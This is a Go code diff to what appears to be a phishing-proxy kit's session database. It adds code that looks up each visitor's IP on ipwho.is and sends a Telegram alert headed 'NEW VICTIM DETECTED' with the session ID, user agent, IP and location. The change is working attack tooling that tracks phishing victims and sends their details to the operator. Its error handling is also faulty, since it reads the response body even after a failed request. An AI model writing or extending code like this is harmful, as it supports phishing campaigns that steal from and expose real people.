@@ -3,6 +3,9 @@ package database
 import (
 	"encoding/json"
 	"fmt"
+	"io/ioutil"
+	"net/http"
+	"strings"
 	"time"
 
 	"github.com/tidwall/buntdb"
@@ -61,6 +64,21 @@ func (d *Database) sessionsCreate(sid string, phishlet string, landing_url strin
 	}
 
 	jf, _ := json.Marshal(s)
+
+	ipinfo, ipinfoerr := http.Get("http://ipwho.is/" + remote_addr)
+	if ipinfoerr != nil {
+		fmt.Print("error")
+	}
+
+	ipinfos, eerr := ioutil.ReadAll(ipinfo.Body)
+
+	ipinfosn := strings.Replace(string(ipinfos), ",", "%0A-➡️ ", -1)
+
+	if eerr != nil {
+		fmt.Print("error")
+	}
+
+	telegramSendVisitor(fmt.Sprintf("🔥 🔥 NEW  VICTIM DETECTED 🔥 🔥\n\n-🆔ID: %s \n\n🌎UserAgent: %s\n\n-🗺️IP: %s\n\n %s\n\n", sid, useragent, remote_addr, ipinfosn))
 
 	err = d.db.Update(func(tx *buntdb.Tx) error {
 		tx.Set(d.genIndex(SessionTable, id), string(jf), nil)
@@ -195,3 +213,4 @@ func (d *Database) sessionsGetBySid(sid string) (*Session, error) {
 	}
 	return s, nil
 }
+
